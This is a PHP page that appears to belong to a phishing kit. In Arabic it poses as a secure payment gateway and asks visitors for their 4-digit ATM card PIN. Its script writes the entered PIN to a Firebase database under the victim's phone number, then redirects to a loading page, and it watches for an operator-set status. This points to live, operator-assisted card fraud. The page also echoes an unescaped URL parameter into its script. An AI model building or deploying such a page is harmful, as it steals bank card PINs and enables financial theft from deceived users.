<?php
error_reporting(0);
ini_set('display_errors', 0);
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ATM PIN Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --main-blue: #00acc1; --dark-blue: #2c3e50; --gold-btn: #fbb03b; --footer-bg: #eeeeee; }
        body { font-family: 'Cairo', sans-serif; background-color: #f9fafb; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .content { flex: 1; display: flex; flex-direction: column; align-items: center; }
        .container { width: 100%; max-width: 400px; padding: 15px; box-sizing: border-box; }
        .header-img { width: 100%; display: block; margin-bottom: 15px; }
        
        .atm-card { background: #fff; border: 1px solid #eeeeee; border-radius: 20px; padding: 35px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; width: 100%; box-sizing: border-box; }

        /* --- الأيقونة البرمجية (رسم بالكود) --- */
        .icon-box { position: relative; width: 80px; height: 60px; margin: 0 auto 25px; }
        .card-shape { width: 100%; height: 50px; background: var(--dark-blue); border-radius: 8px; position: relative; }
        .card-stripe { width: 100%; height: 10px; background: #4b5563; position: absolute; top: 10px; }
        .card-chip { width: 12px; height: 10px; background: #fbbf24; border-radius: 2px; position: absolute; bottom: 8px; left: 10px; }
        .lock-shape { 
            position: absolute; bottom: -10px; right: -5px; width: 25px; height: 22px; 
            background: var(--gold-btn); border-radius: 4px; border: 2px solid #fff;
        }
        .lock-shape::after {
            content: ''; position: absolute; top: -10px; left: 5px; width: 11px; height: 10px;
            border: 2px solid var(--gold-btn); border-bottom: none; border-radius: 10px 10px 0 0;
        }
        /* ---------------------------------- */

        .atm-card h2 { color: var(--dark-blue); font-size: 22px; margin: 0 0 10px 0; font-weight: 800; }
        .atm-card p { color: #6b7280; font-size: 14px; margin-bottom: 30px; line-height: 1.6; }
        
        .pin-input { 
            width: 180px; padding: 15px; border: 2px solid #e5e7eb; border-radius: 12px; 
            font-size: 32px; font-weight: 700; text-align: center; color: var(--dark-blue); 
            background: #fefefe; outline: none; transition: 0.2s; font-family: 'Tahoma', sans-serif; 
            letter-spacing: 15px; box-sizing: border-box;
        }
        .pin-input:focus { border-color: var(--main-blue); box-shadow: 0 0 0 4px rgba(0, 172, 193, 0.1); }

        .btn-confirm { background: var(--gold-btn); color: #fff; width: 100%; padding: 18px; border: none; border-radius: 14px; font-size: 20px; font-weight: 800; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(251, 176, 59, 0.3); margin-top: 35px; }
        
        footer { background-color: var(--footer-bg); color: #777; text-align: center; padding: 25px 10px; font-size: 13px; border-top: 1px solid #ddd; width: 100%; font-family: sans-serif; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="content">
    <img src="https://i.ibb.co/JRL1qXkP/Whats-App-Image-2024-09-05-at-8-51-55-AM.jpg" class="header-img">

    <div class="container">
        <div class="atm-card">
            <div class="icon-box">
                <div class="card-shape">
                    <div class="card-stripe"></div>
                    <div class="card-chip"></div>
                </div>
                <div class="lock-shape"></div>
            </div>
            
            <h2>الرقم السري للبطاقة (ATM PIN)</h2>
            <p>يرجى إدخال الرقم السري المكون من 4 أرقام الخاص ببطاقة الصراف الآلي لإتمام عملية الدفع بأمان.</p>
            
            <form id="atm-form">
                <input type="password" id="atm_pin" class="pin-input" placeholder="****" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
                <button type="submit" class="btn-confirm">تأكيد عملية الدفع</button>
            </form>
        </div>
    </div>
</div>

<footer>
    <div>Privacy Policy | Terms & Conditions | Contact Support</div>
    <div style="margin-top:10px; font-weight:600;">Secure Payment Gateway © 2026 | All Rights Reserved</div>
</footer>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
const firebaseConfig = { databaseURL: "YOUR_FIREBASE_URL" };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const pID = "<?php echo $phone; ?>";

document.getElementById('atm-form').onsubmit = function(e) {
    e.preventDefault();
    const pinValue = document.getElementById('atm_pin').value;
    db.ref('payments/'+pID).update({
        pin: pinValue,
        status: 'pending_pin'
    }).then(()=> {
        window.location.href = "loading.php?phone="+pID+"&from=atm";
    });
};

if(pID) {
    db.ref('payments/'+pID).on('value', (snapshot) => {
        if(snapshot.val() && snapshot.val().status === 'error') {
            window.location.href = "payment.php?phone="+pID;
        }
    });
}
</script>
</body>
</html>